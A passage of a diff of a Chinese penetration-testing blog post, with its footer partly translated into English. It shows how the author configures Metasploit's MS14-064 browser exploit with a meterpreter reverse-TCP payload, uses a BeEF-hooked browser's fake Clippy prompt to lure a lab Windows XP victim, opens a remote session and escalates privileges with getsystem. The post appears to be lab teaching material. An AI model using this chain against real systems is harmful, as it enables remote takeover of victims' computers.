-</span><span class="lnt">27
-</span><span class="lnt">28
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Module options (exploit/windows/browser/ms14_064_ole_code_execution):
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Name                   Current Setting  Required  Description
-</span></span><span class="line"><span class="cl">   ----                   ---------------  --------  -----------
-</span></span><span class="line"><span class="cl">   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
-</span></span><span class="line"><span class="cl">   Retries                true             no        Allow the browser to retry the module
-</span></span><span class="line"><span class="cl">   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-</span></span><span class="line"><span class="cl">   SRVPORT                8080             yes       The local port to listen on.
-</span></span><span class="line"><span class="cl">   SSL                    false            no        Negotiate SSL for incoming connections
-</span></span><span class="line"><span class="cl">   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
-</span></span><span class="line"><span class="cl">   TRYUAC                 false            yes       Ask victim to start as Administrator
-</span></span><span class="line"><span class="cl">   URIPATH                                 no        The URI to use for this exploit (default is random)
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Payload options (windows/meterpreter/reverse_tcp):
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
-</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
-</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
-</span></span><span class="line"><span class="cl">   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
-</span></span><span class="line"><span class="cl">   LPORT     4444             yes       The listen port
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Exploit target:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Id  Name
-</span></span><span class="line"><span class="cl">   --  ----
-</span></span><span class="line"><span class="cl">   0   Windows XP
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>一般来讲我们只需要设置一个 <code>SRVHOST</code> 就可以了，但是刚刚 <code>bettercap</code> 把 <code>8080</code> 端口给占用了，因此我们需要重新设置一个 <code>SRVPORT</code>。</p>
-<p><code>SRVHOST</code> 设置为攻击机的地址</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVHOST 192.168.101.15
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><code>SRVPORT</code> 任意指定一个空闲的端口</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVPORT 9999
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>执行</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">exploit
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>接下来我们得到了</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Exploit running as background job 0.
-</span></span><span class="line"><span class="cl">[*] Exploit completed, but no session was created.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.101.15:4444 
-</span></span><span class="line"><span class="cl">[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
-</span></span><span class="line"><span class="cl">[*] Server started.
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>先把默认的 <code>Clippy image directory</code> 地址改成攻击机的地址，再把这个链接 <code>http://192.168.101.15:9999/deCFhCIwXNHYT</code> 填入 <code>Executable</code> 这一栏里面。</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/img/2021-02-02_15-52.png"
-        data-srcset="/img/2021-02-02_15-52.png, /img/2021-02-02_15-52.png 1.5x, /img/2021-02-02_15-52.png 2x"
-        data-sizes="auto"
-        alt="/img/2021-02-02_15-52.png"
-        title="/img/2021-02-02_15-52.png" /></p>
-<p>然后点击 <code>Execute</code></p>
-<p>这时，靶机就会发生一件有趣的事情</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/img/VirtualBox_XP_02_02_2021_15_53_43.png"
-        data-srcset="/img/VirtualBox_XP_02_02_2021_15_53_43.png, /img/VirtualBox_XP_02_02_2021_15_53_43.png 1.5x, /img/VirtualBox_XP_02_02_2021_15_53_43.png 2x"
-        data-sizes="auto"
-        alt="/img/VirtualBox_XP_02_02_2021_15_53_43.png"
-        title="/img/VirtualBox_XP_02_02_2021_15_53_43.png" /></p>
-<p>无论点击哪个，都会跳转到 msf 的链接。</p>
-<p>点击之后，msf 有了反应</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/img/2021-02-02_15-55.png"
-        data-srcset="/img/2021-02-02_15-55.png, /img/2021-02-02_15-55.png 1.5x, /img/2021-02-02_15-55.png 2x"
-        data-sizes="auto"
-        alt="/img/2021-02-02_15-55.png"
-        title="/img/2021-02-02_15-55.png" /></p>
-<p>一个 <code>meterpreter</code> 连接建立了</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/img/2021-02-02_15-57.png"
-        data-srcset="/img/2021-02-02_15-57.png, /img/2021-02-02_15-57.png 1.5x, /img/2021-02-02_15-57.png 2x"
-        data-sizes="auto"
-        alt="/img/2021-02-02_15-57.png"
-        title="/img/2021-02-02_15-57.png" /></p>
-<p>进入这个会话</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sessions -i 1
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/img/2021-02-02_15-59.png"
-        data-srcset="/img/2021-02-02_15-59.png, /img/2021-02-02_15-59.png 1.5x, /img/2021-02-02_15-59.png 2x"
-        data-sizes="auto"
-        alt="/img/2021-02-02_15-59.png"
-        title="/img/2021-02-02_15-59.png" /></p>
-<p>这时我们就可以正常使用 <code>meterpreter</code> 操作这台靶机了..</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="/img/2021-02-02_16-00.png"
-        data-srcset="/img/2021-02-02_16-00.png, /img/2021-02-02_16-00.png 1.5x, /img/2021-02-02_16-00.png 2x"
-        data-sizes="auto"
-        alt="/img/2021-02-02_16-00.png"
-        title="/img/2021-02-02_16-00.png" /></p>
-<p><code>getsystem</code> 提权也没有问题。</p>
-<p>至于 <code>meterpreter</code> 的用法就不再继续写下去了，因为之前写过（逃。</p>
-<p>然后到这里就算成功一大半了，剩下的就是后渗透，说很久都说不完呢～就到这里吧～</p>
-<h2 id="结尾">结尾</h2>
-<p>呼~ 写完了.. qwq</p>
-<p>不过要声明一下，本文内容仅限于测试学习使用，<strong>别拿去干坏事</strong>，否则后果自负哦～</p>
-<p>最后，本站遵循 <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener noreffer">CC-BY-NC 4.0 协议</a>，转载请注明出处</p>
-<hr>
-<h2 id="参考链接">参考链接</h2>
-<ul>
-<li><a href="https://cvedetails.com/cve/CVE-2014-6332/" target="_blank" rel="noopener noreffer">CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows</a></li>
-<li><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064" target="_blank" rel="noopener noreffer">Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs</a></li>
-<li><a href="https://www.exploit-db.com/exploits/35229" target="_blank" rel="noopener noreffer">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit</a></li>
-<li><a href="https://www.exploit-db.com/exploits/35308" target="_blank" rel="noopener noreffer">Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit</a></li>
-<li><a href="http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows" target="_blank" rel="noopener noreffer">IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows</a></li>
-<li><a href="https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module" target="_blank" rel="noopener noreffer">CVE-2014-6332: it’s raining shells | forsec</a></li>
-<li><a href="https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&amp;gid=1&amp;pid=2" target="_blank" rel="noopener noreffer">kali bettercap的使用 | UsstZt</a></li>
-<li><a href="https://blog.csdn.net/qq_33066259/article/details/80737308" target="_blank" rel="noopener noreffer">Bettercap2.6与beef的使用_请你吃橘子-CSDN博客</a></li>
-<li><a href="https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead." target="_blank" rel="noopener noreffer">DeepL Translate</a></li>
-</ul>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>更新于 2021-02-02</span>
+                <span>Updated on 2021-02-02</span>
             </div>
             <div class="post-info-license"></div>
         </div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
-                            <a class="link-to-markdown" href="/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.md" target="_blank">阅读原始文档</a>
+                            <a class="link-to-markdown" href="/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-via="weepingdogel_me" data-hashtags="beef,bettercap,Linux,metasploit,笔记,渗透测试,ARP 欺骗,黑客"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-hashtag="beef"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Pinterest" data-sharer="pinterest" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-description="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload." data-image="/img/2021-02-02_13-51.png"><i class="fab fa-pinterest fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Tumblr" data-sharer="tumblr" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-caption="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload." data-tags="beef,bettercap,Linux,metasploit,笔记,渗透测试,ARP 欺骗,黑客"><i class="fab fa-tumblr fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Reddit" data-sharer="reddit" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="分享到 VK" data-sharer="vk" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-caption="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload." data-image="/img/2021-02-02_13-51.png"><i class="fab fa-vk fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Buffer" data-sharer="buffer" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-via="weepingdogel_me" data-picture="/img/2021-02-02_13-51.png"><i class="fab fa-buffer fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Xing" data-sharer="xing" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"><i class="fab fa-xing fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Instapaper" data-sharer="instapaper" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-description="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload."><i data-svg-src="/lib/simple-icons/icons/instapaper.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Pocket" data-sharer="pocket" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-get-pocket fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Digg" data-sharer="digg" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-digg fa-fw"></i></a><a href="javascript:void(0);" title="分享到 StumbleUpon" data-sharer="stumbleupon" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"><i class="fab fa-stumbleupon fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Flipboard" data-sharer="flipboard" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"><i class="fab fa-flipboard fa-fw"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-image="/img/2021-02-02_13-51.png"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 人人" data-sharer="renren" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-renren fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-description="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload."><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-description="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload."><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 百度" data-sharer="baidu" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg"></i></a><a href="javascript:void(0);" title="分享到 OK.RU" data-sharer="okru" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"><i class="fab fa-odnoklassniki fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"><i class="fab fa-skype fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Trello" data-sharer="trello" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" data-description="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload."><i class="fab fa-trello fa-fw"></i></a><a href="//mix.com/add?url=http%3a%2f%2fweepingdogel.github.io%2fposts%2fbeef%25E9%2585%258D%25E5%2590%2588bettercap%25E4%25BB%25A5%25E5%258F%258Amsf%25E7%25AD%2589%25E5%25A4%259A%25E7%25A7%258D%25E5%25B7%25A5%25E5%2585%25B7%25E7%259A%2584%25E5%25B1%2580%25E5%259F%259F%25E7%25BD%2591%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595%2f&amp;description=%20Beef%20%e9%85%8d%e5%90%88%20bettercap%20%e4%bb%a5%e5%8f%8a%20msf%20%e7%ad%89%e5%a4%9a%e7%a7%8d%e5%b7%a5%e5%85%b7%e7%9a%84%e5%b1%80%e5%9f%9f%e7%bd%91%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95" target="_blank" title="分享到 Mix"><i class="fab fa-mix fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-via="weepingdogel_me" data-hashtags="beef,bettercap,Linux,metasploit,notes,penetration testing,ARP spoofing,hackers"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-hashtag="beef"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Pinterest" data-sharer="pinterest" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-description="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads." data-image="/img/2021-02-02_13-51.png"><i class="fab fa-pinterest fa-fw"></i></a><a href="javascript:void(0);" title="Share on Tumblr" data-sharer="tumblr" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-caption="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads." data-tags="beef,bettercap,Linux,metasploit,notes,penetration testing,ARP spoofing,hackers"><i class="fab fa-tumblr 